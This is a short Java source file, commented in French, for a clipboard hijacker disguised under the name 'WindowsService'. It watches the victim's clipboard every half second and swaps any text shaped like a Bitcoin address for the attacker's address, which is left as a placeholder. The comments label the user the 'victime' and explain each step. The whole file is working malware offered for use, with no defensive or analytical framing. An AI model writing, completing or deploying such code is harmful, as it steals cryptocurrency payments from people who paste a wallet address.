package windows.service;

import java.awt.Toolkit; /* Bibliothèque pour récupérer le presse-papier actuel de la victime */ 
import java.awt.datatransfer.*; /* Bibliothèque pour lire et transférer les données du presse-papier  */
import java.util.regex.Pattern; /* Bibliothèque pour préparer un pattern regex :) */

public class WindowsService {
    private static final String TEXT_REPLACEMENT = "Adresse_Bitcoin_Attaquant"; /* ICI, il faut mettre l'adresse bitcoin de l'attaquant */
    private static final Pattern BTC_PATTERN = Pattern.compile("^[a-zA-Z0-9]{20,75}$"); /*On compile du regex au format de l'adresse bitcoin pour pouvoir comparer le texte copié avec celle-ci. */
    public static void main(String[] args) {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard(); /* Récupére le contenu du presse-papier de la victime */

        while (true) { /* Il faut exécuter le programme jusqu'à ce qu'il soit interrompu */
            try {
                if (clipboard.isDataFlavorAvailable(DataFlavor.stringFlavor)) {  /* Vérifie si le contenu du presse-papier correspond bien à du texte */
                    String currentText = (String) clipboard.getData(DataFlavor.stringFlavor); /* récupére le texte copié */

                    
                    if (BTC_PATTERN.matcher(currentText).matches()) { /* Vérifie si le texte copié est similaire au format d'une adresse bitcoin en passant par du regex */
                        StringSelection selection = new StringSelection(TEXT_REPLACEMENT); /* Si tel est le cas, on crée un objet StringSelection contenant le texte à placer dans le presse-papier */
                        clipboard.setContents(selection, null); /* On remplace le texte copié par notre adresse bitcoin */
                    }
                }

                Thread.sleep(500); /* On place un délai d'attente du processus pour éviter que la boucle tourne très rapidement */
            } catch (InterruptedException e) { /* On renvoie une erreur d'interruption si jamais l'utilisateur tue le processus */
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) { /* Ceci pour les autres erreurs */
                e.getStackTrace();
            }
            
        }
    }
}
